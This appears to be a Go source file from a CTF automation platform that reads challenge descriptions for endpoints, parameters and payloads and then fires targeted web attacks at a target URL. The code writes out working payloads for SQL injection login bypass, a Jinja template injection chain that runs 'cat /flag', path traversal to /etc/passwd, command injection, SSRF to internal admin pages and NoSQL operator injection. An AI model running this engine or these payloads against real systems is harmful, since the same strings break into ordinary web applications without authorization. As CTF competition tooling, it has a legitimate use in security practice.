package ctfplatform

// web_hints.go —— 题目感知的定向渗透（Hint-Driven Exploitation）。
//
// 动机（实测暴露的能力缺口）：既有 ExploitWebTarget 用**硬编码端点**探测
// （/ssti、/page、/cmd、/fetch、/login、/nosql），一旦真实靶机的端点不叫这些名字
// （/cmd.php、/index.php?page=、/profile?name=、/fetch.php?url=、/api/auth、/login.php），
// 整条链就全空。而这类端点在真题描述里**写得明明白白**——
// "GET /cmd.php?ip=127.0.0.1;cat /flag"、"POST /login user=admin' OR 1=1--&pass=x"。
// 真人选手正是照着这些线索定向打。
//
// 本文件把「读题取线索」做成能力：解析描述里的端点/参数名/载荷/漏洞类型，
// 优先按线索定向投递，未命中再回落到通用探测（exploitGenericStages）。
//
// 安全：仅对显式给出的 baseURL 发起请求，仍受 webExploitEnabled() 总开关约束。

import (
	"context"
	"net/http"
	"net/url"
	"regexp"
	"sort"
	"strings"
)

// WebHints 从题目描述里提取的定向渗透线索。
type WebHints struct {
	Endpoints []string // 绝对路径（/cmd.php、/index.php、/api/auth…）
	Params    []string // 参数名（ip、page、url、user、pass、name…）
	Payloads  []string // 描述里直接给出的载荷片段
	Types     []string // 漏洞类型：sqli/ssti/lfi/ssrf/cmdi/nosql/xxe
}

var (
	// reHintMethodPath 匹配 "GET /cmd.php?ip=..." / "POST /login user=..." 形态。
	reHintMethodPath = regexp.MustCompile(`(?i)\b(?:GET|POST|PUT|DELETE)\s+(/[A-Za-z0-9_\-./%{}]*)`)
	// reHintFilePath 匹配带扩展名的路径（/index.php、/cmd.php、/robots.txt…）。
	reHintFilePath = regexp.MustCompile(`/[A-Za-z0-9_\-./]*\.(?:php|asp|aspx|jsp|jspx|py|html?|json|txt|action|do|cgi)\b`)
	// reHintBarePath 匹配无扩展名的常见端点（/admin、/api/auth、/internal/admin…）。
	reHintBarePath = regexp.MustCompile(`/(?:[A-Za-z0-9_\-]+/)+[A-Za-z0-9_\-]+|/(?:login|admin|index|cmd|fetch|page|search|profile|upload|api|xml|source|robots\.txt|internal)\b[A-Za-z0-9_\-./]*`)
	// reHintQueryParam 匹配 "?ip=..." / "&pass=x" 里的参数名。
	reHintQueryParam = regexp.MustCompile(`[?&]([A-Za-z_][A-Za-z0-9_]{0,20})=`)
	// reHintJSONKey 匹配 {"user": {...}} 里的键名。
	reHintJSONKey = regexp.MustCompile(`"([A-Za-z_][A-Za-z0-9_]{0,20})"\s*:`)
	// reHintFormPair 匹配 user=admin&pass=x 形态的字段名。
	reHintFormPair = regexp.MustCompile(`\b([A-Za-z_][A-Za-z0-9_]{0,20})=([^\s&"'<>]{1,40})`)
	// reHintParamWord 匹配「参数名 name」「参数 name」「param: q」这类自然语言线索。
	reHintParamWord = regexp.MustCompile(`(?i)(?:参数名|参数|字段|param(?:eter)?|var|变量)\s*[:：为]?\s*["']?([A-Za-z_][A-Za-z0-9_]{0,20})`)
)

// hintTypePatterns 漏洞类型判定（描述里出现即认为该类型相关）。
var hintTypePatterns = []struct {
	typ string
	re  *regexp.Regexp
}{
	{"sqli", regexp.MustCompile(`(?i)or\s+1=1|'\s*or\s*'|or\s+'1'='1|union\s+select|sql\s*注入|sqli`)},
	{"ssti", regexp.MustCompile(`\{\{|\}\}|ssti|模板注入|jinja|twig`)},
	{"lfi", regexp.MustCompile(`\.\./|etc/passwd|flag\.txt|文件包含|路径遍历|lfi|rfi`)},
	{"cmdi", regexp.MustCompile(`[;&|]\s*(?:cat|ls|id|whoami|curl|wget)|命令注入|rce|cmdi|exec`)},
	{"ssrf", regexp.MustCompile(`(?i)ssrf|127\.0\.0\.1|localhost|file://|内网|internal`)},
	{"nosql", regexp.MustCompile(`\$ne|\$gt|\$regex|\$where|nosql|mongodb|mongo`)},
	{"xxe", regexp.MustCompile(`(?i)<!entity|xxe|xml\s*外部实体`)},
	{"upload", regexp.MustCompile(`(?i)upload|上传|content-type|image/png|\.php\.jpg`)},
}

// hintParamBlacklist 明显不是参数名的捕获（协议头/编码等）。
var hintParamBlacklist = map[string]bool{
	"http": true, "https": true, "utf": true, "charset": true, "xmlns": true,
	"Content": true, "content": true, "type": true, "xml": true,
}

// ParseWebHints 从题目描述文本里提取定向渗透线索。
// 纯字符串解析，不发起任何网络请求。
func ParseWebHints(text string) WebHints {
	var h WebHints
	if strings.TrimSpace(text) == "" {
		return h
	}

	seen := map[string]bool{}
	add := func(dst *[]string, v string) {
		v = strings.TrimSpace(v)
		if v == "" || seen["e:"+v] && dst == &h.Endpoints {
			return
		}
		for _, old := range *dst {
			if old == v {
				return
			}
		}
		if len(*dst) >= 12 {
			return
		}
		*dst = append(*dst, v)
	}

	// ── 端点 ──
	for _, re := range []*regexp.Regexp{reHintMethodPath, reHintFilePath, reHintBarePath} {
		for _, m := range re.FindAllStringSubmatch(text, 12) {
			p := m[len(m)-1]
			if !strings.HasPrefix(p, "/") || strings.Contains(p, "//") {
				continue
			}
			// 去掉查询串，只留路径
			if i := strings.IndexAny(p, "?"); i >= 0 {
				p = p[:i]
			}
			if p == "/" || p == "" {
				continue
			}
			add(&h.Endpoints, p)
		}
	}

	// ── 参数名 ──
	for _, re := range []*regexp.Regexp{reHintQueryParam, reHintJSONKey, reHintFormPair, reHintParamWord} {
		for _, m := range re.FindAllStringSubmatch(text, 24) {
			k := m[1]
			if hintParamBlacklist[k] || len(k) == 0 {
				continue
			}
			add(&h.Params, k)
		}
	}

	// ── 载荷片段 ──：把描述里"像 payload"的片段原样保留（真人给的攻击串最好使）
	for _, tok := range strings.FieldsFunc(text, func(r rune) bool {
		return r == '\n' || r == '\r' || r == '"' || r == '\''
	}) {
		t := strings.TrimSpace(tok)
		if len(t) < 6 || len(t) > 120 {
			continue
		}
		if strings.Contains(t, "{{") || strings.Contains(t, "../") ||
			strings.Contains(t, "OR 1=1") || strings.Contains(t, "$ne") ||
			strings.Contains(t, ";cat ") || strings.Contains(t, "|cat ") ||
			strings.Contains(t, "127.0.0.1") || strings.Contains(t, "etc/passwd") {
			add(&h.Payloads, t)
		}
	}

	// ── 漏洞类型 ──
	for _, tp := range hintTypePatterns {
		if tp.re.MatchString(text) {
			h.Types = append(h.Types, tp.typ)
		}
	}
	return h
}

func hintsHaveType(h WebHints, typ string) bool {
	for _, t := range h.Types {
		if t == typ {
			return true
		}
	}
	return false
}

// hintParamsFor 返回某漏洞类型下要试的参数名：题目给的参数名优先，补通用名。
func hintParamsFor(h WebHints, typ string, fallback ...string) []string {
	var out []string
	seen := map[string]bool{}
	add := func(p string) {
		if p == "" || seen[p] {
			return
		}
		seen[p] = true
		out = append(out, p)
	}
	for _, p := range h.Params {
		add(p)
	}
	for _, p := range fallback {
		add(p)
	}
	if len(out) > 8 {
		out = out[:8]
	}
	return out
}

// mergeEndpoints 合并端点来源：题目线索优先，其次首页抓取，去重后截断到 cap。
// 顺序有意义——线索给的端点最可信，先打。
func mergeEndpoints(hinted []string, discovered map[string]bool, cap int) []string {
	seen := map[string]bool{}
	var out []string
	add := func(p string) {
		if p == "" || p == "/" || seen[p] || len(out) >= cap {
			return
		}
		seen[p] = true
		out = append(out, p)
	}
	for _, p := range hinted {
		add(p)
	}
	if len(discovered) > 0 {
		keys := make([]string, 0, len(discovered))
		for k := range discovered {
			keys = append(keys, k)
		}
		sort.Strings(keys)
		for _, k := range keys {
			add(k)
		}
	}
	return out
}

// hintProbeGET 带去重地发一次 GET 并扫描响应。
func hintProbeGET(ctx context.Context, cl *http.Client, u, scene string,
	record func(...WebFinding), visited map[string]bool) {
	if visited[u] {
		return
	}
	visited[u] = true
	if code, body, hdr, err := webFetch(ctx, cl, u); err == nil && code > 0 {
		record(passiveScan(scene, u, body, hdr)...)
	}
}

// hintPostForm 带去重地发一次表单 POST 并扫描响应。
func hintPostForm(ctx context.Context, cl *http.Client, u, scene string, form url.Values,
	record func(...WebFinding), visited map[string]bool) {
	key := "POST " + u + " " + form.Encode()
	if visited[key] {
		return
	}
	visited[key] = true
	if code, body, hdr, err := webPostForm(ctx, cl, u, form); err == nil && code > 0 {
		record(passiveScan(scene, u+" [POST]", body, hdr)...)
	}
}

// exploitHintStages 按题目线索定向渗透：端点/参数/载荷全部来自描述，
// 而不是硬编码猜测。命中后仍继续跑通用阶段（不减少既有能力）。
func exploitHintStages(ctx context.Context, cl *http.Client, base string, h WebHints,
	record func(...WebFinding), visited map[string]bool) {

	eps := h.Endpoints
	if len(eps) == 0 {
		return
	}
	if len(eps) > 8 {
		eps = eps[:8]
	}

	for _, ep := range eps {
		// 0) 端点本身：源码注释 / base64 / cookie / 未授权内容泄漏
		hintProbeGET(ctx, cl, base+ep, "hint_page", record, visited)

		// 1) SQL 注入登录绕过
		if hintsHaveType(h, "sqli") {
			payloads := append([]string{}, h.Payloads...)
			payloads = append(payloads, "admin' OR 1=1--", "admin' OR '1'='1", "' OR 1=1#", "admin'--")
			for _, p := range payloads {
				if !strings.Contains(strings.ToUpper(p), "OR") && !strings.Contains(p, "--") {
					continue
				}
				for _, param := range hintParamsFor(h, "sqli", "user", "username", "pass", "password") {
					hintProbeGET(ctx, cl, base+ep+"?"+param+"="+url.QueryEscape(p), "hint_sqli", record, visited)
					form := url.Values{}
					for _, other := range hintParamsFor(h, "sqli", "user", "username", "pass", "password") {
						if other == param {
							form.Set(other, p)
						} else {
							form.Set(other, "x")
						}
					}
					hintPostForm(ctx, cl, base+ep, "hint_sqli", form, record, visited)
				}
			}
		}

		// 2) SSTI：先确认模板执行（49），再上 flag 读取载荷
		if hintsHaveType(h, "ssti") {
			for _, param := range hintParamsFor(h, "ssti", "name", "q", "input", "text", "msg") {
				probe := base + ep + "?" + param + "=" + url.QueryEscape("{{7*7}}")
				if visited[probe] {
					continue
				}
				visited[probe] = true
				_, body, _, err := webFetch(ctx, cl, probe)
				if err != nil || len(body) == 0 {
					continue
				}
				if !strings.Contains(string(body), "49") {
					continue
				}
				for _, payload := range []string{
					"{{flag()}}", "{{config.FLAG}}", "{{config['FLAG']}}",
					"{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat /flag').read()}}",
				} {
					hintProbeGET(ctx, cl, base+ep+"?"+param+"="+url.QueryEscape(payload), "hint_ssti", record, visited)
				}
			}
		}

		// 3) LFI / 路径遍历
		if hintsHaveType(h, "lfi") {
			payloads := []string{"../../../../etc/passwd", "flag.txt", "../flag.txt", "/flag.txt", "....//....//flag.txt"}
			for _, p := range h.Payloads {
				if strings.Contains(p, "../") || strings.Contains(p, "flag.txt") {
					payloads = append([]string{p}, payloads...)
				}
			}
			for _, param := range hintParamsFor(h, "lfi", "page", "file", "path", "template", "doc") {
				for _, p := range payloads {
					hintProbeGET(ctx, cl, base+ep+"?"+param+"="+url.QueryEscape(p), "hint_lfi", record, visited)
				}
			}
		}

		// 4) 命令注入
		if hintsHaveType(h, "cmdi") {
			payloads := []string{"127.0.0.1;cat /flag", "127.0.0.1;cat /flag.txt", "127.0.0.1|cat /flag", "127.0.0.1 && cat /flag"}
			for _, p := range h.Payloads {
				if strings.ContainsAny(p, ";&|") {
					payloads = append([]string{p}, payloads...)
				}
			}
			for _, param := range hintParamsFor(h, "cmdi", "ip", "cmd", "host", "ping") {
				for _, p := range payloads {
					hintProbeGET(ctx, cl, base+ep+"?"+param+"="+url.QueryEscape(p), "hint_cmdi", record, visited)
				}
			}
		}

		// 5) SSRF：把靶机自身当"内网"
		if hintsHaveType(h, "ssrf") {
			inners := []string{base + "/internal/admin", base + "/admin", "http://127.0.0.1/internal/admin", "http://127.0.0.1:8080/internal/admin"}
			for _, p := range h.Payloads {
				if strings.HasPrefix(p, "http") || strings.Contains(p, "127.0.0.1") {
					inners = append([]string{p}, inners...)
				}
			}
			for _, param := range hintParamsFor(h, "ssrf", "url", "uri", "target", "fetch", "link") {
				for _, inner := range inners {
					hintProbeGET(ctx, cl, base+ep+"?"+param+"="+url.QueryEscape(inner), "hint_ssrf", record, visited)
				}
			}
		}

		// 6) NoSQL 运算符注入（JSON）
		if hintsHaveType(h, "nosql") {
			keys := hintParamsFor(h, "nosql", "user", "pass", "username", "password")
			k1, k2 := keys[0], keys[0]
			if len(keys) > 1 {
				k2 = keys[1]
			}
			payloads := []string{
				`{"` + k1 + `":{"$ne":""},"` + k2 + `":{"$ne":""}}`,
				`{"` + k1 + `":{"$gt":""},"` + k2 + `":{"$gt":""}}`,
				`{"` + k1 + `":"admin","` + k2 + `":{"$ne":null}}`,
			}
			for _, p := range h.Payloads {
				if strings.Contains(p, "$ne") || strings.Contains(p, "$gt") {
					payloads = append([]string{p}, payloads...)
				}
			}
			for _, payload := range payloads {
				key := "JSON " + base + ep + " " + payload
				if visited[key] {
					continue
				}
				visited[key] = true
				if code, body, hdr, err := webPostJSON(ctx, cl, base+ep, payload); err == nil && code > 0 {
					record(passiveScan("hint_nosql", base+ep+" [POST json]", body, hdr)...)
				}
			}
		}
	}
}
